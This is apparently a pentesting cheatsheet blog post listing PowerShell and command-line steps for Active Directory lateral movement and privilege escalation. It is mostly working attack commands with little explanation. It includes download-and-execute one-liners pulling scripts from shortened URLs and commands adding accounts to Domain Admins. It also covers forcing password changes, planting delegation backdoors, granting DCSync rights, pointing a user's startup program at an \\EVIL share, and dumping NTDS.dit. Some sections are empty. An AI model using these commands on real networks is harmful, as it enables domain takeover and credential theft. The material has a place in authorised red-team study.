---
layout: post
title: TA0008 Lateral Movement - AD Privilege Escalation with Powershell
parent: Pentesting
category: Pentesting
grand_parent: Cheatsheets
modified_date: 2022-02-11
permalink: /:categories/:title/
---
<!-- vscode-markdown-toc -->
* [PRE-REQUISITE: Installing PowerUp and PowerSploit](#PRE-REQUISITE:InstallingPowerUpandPowerSploit)
* [Tampering the OS to enabling Remote Administration](#TamperingtheOStoenablingRemoteAdministration)
* [LATERAL MOVEMENT](#LATERALMOVEMENT)
* [PRIVESC](#PRIVESC)
* [TOKEN IMPERSONATION](#TOKENIMPERSONATION)
* [ADD MEMBER](#ADDMEMBER)
* [FORCE PASSWORD CHANGE](#FORCEPASSWORDCHANGE)
* [KERBEROASTING](#KERBEROASTING)
* [ABUSING DELEGATION](#ABUSINGDELEGATION)
* [DUMP NTDS.DIT](#DUMPNTDS.DIT)

<!-- vscode-markdown-toc-config
	numbering=false
	autoSave=true
	/vscode-markdown-toc-config -->
<!-- /vscode-markdown-toc -->

## <a name='PRE-REQUISITE:InstallingPowerUpandPowerSploit'></a>PRE-REQUISITE: Installing PowerUp and PowerSploit

- [PowerUp CheatSheet](https://github.com/HarmJ0y/CheatSheets/blob/master/PowerUp.pdf)
- [PowerSploit CheatSheet](https://github.com/HarmJ0y/CheatSheets/blob/master/PowerSploit.pdf)

```powershell
# ActiveDirectory Module
iex (new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1');Import-ActiveDirectory

# PowerUp Module
iex (new-Object Net.WebClient).DownloadString('http://bit.ly/1PdjSHk'); . .\PowerUp.ps1

# PowerSploit Module
iex (new-Object Net.WebClient).DownloadString('http://bit.ly/28RwLgo'); . .\PowerSploit.ps1
```

## <a name='TamperingtheOStoenablingRemoteAdministration'></a>Tampering the OS to enabling Remote Administration
```powershell
# powershell remoting enable / verify (Needs Admin Access)
Enable-PSRemoting

# WMI remoting as user authenticated on the Da / execution with DC privileges
Set-RemoteWMI -UserName johndoe -ComputerName dcorp-dc.dollarcorp.moneycorp.local -namespace 'root\cimv2' -Verbose

# RDP : enable / disable / check access
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f
reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections

```

## <a name='LATERALMOVEMENT'></a>LATERAL MOVEMENT
```powershell
Invoke-DCOM
Invoke-SMBExec
Invoke-PsExec
Invoke-Command
mstsc.exe
```

## <a name='PRIVESC'></a>PRIVESC
```
Get-Hotfix
```

## <a name='TOKENIMPERSONATION'></a>TOKEN IMPERSONATION

## <a name='ADDMEMBER'></a>ADD MEMBER
```
# OPTION 1
net group "Domain admins" dagreat /add /domain

# OPTION 2
$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('<Domain>\dagreat',$SecPassword)
Add-DomainGroupMember -Identity 'Domain Admins' -Members 'jomivz' -Credential $Cred

# VERIFICATION
Get-DomainGroupMember -Identity 'Domain Admins'

# set the specified property for the given user identity
Set-DomainObject testuser -Set @{'mstsinitialprogram'='\\EVIL\program.exe'} -Verbose

# Set the owner of 'dfm' in the current domain to 'harmj0y'
Set-DomainObjectOwner -Identity dfm -OwnerIdentity harmj0y
```


## <a name='FORCEPASSWORDCHANGE'></a>FORCE PASSWORD CHANGE
```
# OPTION 1
net user dagreat Password123! /domain

# OPTION 2
$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('<Domain>\dagreat',$SecPassword)
$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
Set-DomainUserPassword -Identity dagreat -AccountPassword $UserPassword -Credential $Cred
```

## <a name='KERBEROASTING'></a>KERBEROASTING
```

```
## <a name='ABUSINGDELEGATION'></a>ABUSING DELEGATION
```
# configure the CD backdoor with proto transition
Get-ADComputer -Identity <ServiceA> | Set-ADAccountControl -TrustedToAuthForDelegation $true
Set-ADComputer -Identity DC01 -Add @{'msDS-AllowedDelegationTo'=@('CIFS/DC01.corp')}

# configure a RBCD backdoor
# ServiceB has 'msDS-AllowedToActOnBehalfOfOtherIdentity' set, pointing to ServiceA
Set-ADComputer <ServiceB> -PrincipalAllowedToDelegateToAccount <ServiceA>

# trigger the backdoor
[Reflection::Assembly]::LoadWithPartialName('System.IdentityModel') | out-null
$idToImpersonate = New-Object System.Security.Principal.WindowsIdentity @('<DAgreat>')
$idToImpersonate.Impersonate()
```

# Set A DCSYNC
```
Add-ObjectAcl -TargetDistinguishedName "dc=<DC01>,dc=local" -PrincipalSamAccountName <sogreatW -Rights DCSync -Verbose
```

## <a name='DUMPNTDS.DIT'></a>DUMP NTDS.DIT
```
ntdsutil.exe "activate instance ntds" "ifm" "Create Full C:\Temp\ntds.dmp" quit quit
```
